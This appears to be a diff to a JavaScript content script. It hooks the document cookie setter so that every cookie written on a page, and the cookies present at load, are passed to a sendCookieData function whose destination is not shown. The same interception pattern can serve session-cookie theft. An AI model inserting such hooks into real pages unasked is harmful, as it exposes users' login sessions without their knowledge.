@@ -1,9 +1,6 @@
-const COOKIE_POLL_INTERVAL_MS = 1000;
-let lastCookieState = document.cookie;
-
 const originalCookie = Object.getOwnPropertyDescriptor(
   Document.prototype,
-  "cookie"
+  "cookie",
 );
 
 const originalSetter = originalCookie.set;
@@ -26,14 +23,14 @@ const cookieSetter = (value) => {
   // call the original setter
   try {
     if (typeof originalSetter === "function") {
-      result = originalSetter.call(this, value);
+      result = originalSetter.call(document, value);
     }
   } catch (error) {}
 
   if (!value) {
     return result;
   }
-  
+
   sendCookieData(value);
 
   return result;
@@ -47,24 +44,10 @@ Object.defineProperty(Document.prototype, "cookie", {
   set: cookieSetter,
 });
 
-// poll changes to document.cookies
-const pollForCookies = () => {
-  setTimeout(() => {
-    try {
-      const currentCookieState = document.cookie;
-      if (currentCookieState === lastCookieState) {
-        pollForCookies();
-        return;
-      }
+try {
+  const initialCookies = document.cookie;
 
-      lastCookieState = currentCookieState;
-
-      sendCookieData(currentCookieState);
-      pollForCookies();
-    } catch (error) {
-      pollForCookies();
-    }
-  }, COOKIE_POLL_INTERVAL_MS);
-};
-
-pollForCookies();
+  if (initialCookies) {
+    sendCookieData(initialCookies);
+  }
+} catch (error) {}
